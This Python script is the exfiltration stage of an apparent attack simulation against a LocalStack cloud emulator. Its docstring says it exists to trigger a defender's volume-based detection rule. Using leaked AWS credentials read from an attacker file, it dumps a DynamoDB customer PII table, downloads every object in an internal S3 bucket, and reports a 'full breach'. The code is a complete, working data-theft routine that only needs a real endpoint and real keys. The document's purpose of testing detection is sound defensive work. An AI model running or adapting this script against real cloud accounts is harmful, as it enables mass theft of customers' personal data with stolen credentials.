"""STAGE 4 — Exfiltration.
Uses the leaked credentials to bulk-dump the DynamoDB PII table and download
every object from the internal bucket, deliberately fast/unthrottled so the
defender's volume-based detection rule fires clearly."""
import json
import os

import boto3

ENDPOINT = os.environ.get("LOCALSTACK_ENDPOINT", "http://localhost:4566")
CREDS_FILE = "attacker/.leaked_creds"
INTERNAL_BUCKET = "internal-customer-data"
PII_TABLE = "CustomerPII"


def load_creds():
    with open(CREDS_FILE) as f:
        return json.load(f)


def main():
    print("=== STAGE 4: Exfiltration ===")
    creds = load_creds()
    session = boto3.session.Session(
        aws_access_key_id=creds["access_key_id"],
        aws_secret_access_key=creds["secret_access_key"],
        region_name="us-east-1",
    )

    dynamodb = session.client("dynamodb", endpoint_url=ENDPOINT)
    print(f"[+] Scanning table '{PII_TABLE}'...")
    resp = dynamodb.scan(TableName=PII_TABLE)
    items = resp.get("Items", [])
    print(f"[+] Dumped {len(items)} customer PII records.")
    for item in items[:3]:
        print(f"    {item}")
    print("    ... (truncated)")

    s3 = session.client("s3", endpoint_url=ENDPOINT)
    print(f"\n[+] Downloading all objects from '{INTERNAL_BUCKET}'...")
    objects = s3.list_objects_v2(Bucket=INTERNAL_BUCKET).get("Contents", [])
    total_bytes = 0
    for obj in objects:
        body = s3.get_object(Bucket=INTERNAL_BUCKET, Key=obj["Key"])["Body"].read()
        total_bytes += len(body)
        print(f"    downloaded {obj['Key']} ({len(body)} bytes)")

    print(f"\n[+] Exfiltrated {len(items)} PII records and {total_bytes} bytes of files.")
    print("=== STAGE 4 COMPLETE — full breach achieved ===\n")


if __name__ == "__main__":
    main()
